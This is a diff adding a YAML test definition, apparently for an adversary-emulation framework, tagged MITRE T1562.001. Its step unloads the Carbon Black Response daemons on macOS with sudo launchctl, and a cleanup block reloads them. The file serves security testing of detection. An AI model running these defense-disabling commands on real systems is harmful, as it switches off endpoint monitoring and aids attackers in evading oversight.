@@ -1,0 +1,26 @@
+api_version: "2.0"
+name: Disable Carbon Black Response
+description: |
+    Disables Carbon Black Response
+uuid: 8fba7766-2d11-4b4a-979a-1e3d9cc9a88c
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1562: Impair Defenses'
+    subtechniques:
+        - 'T1562.001: Disable or Modify Tools'
+requirements:
+    platforms:
+        - os: macos
+steps:
+    - name: disable-carbon-black-response
+      inline: |
+        sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist
+        sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
+      executor: sh
+      cleanup:
+        inline: |
+            sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.daemon.plist
+            sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
+        executor: sh
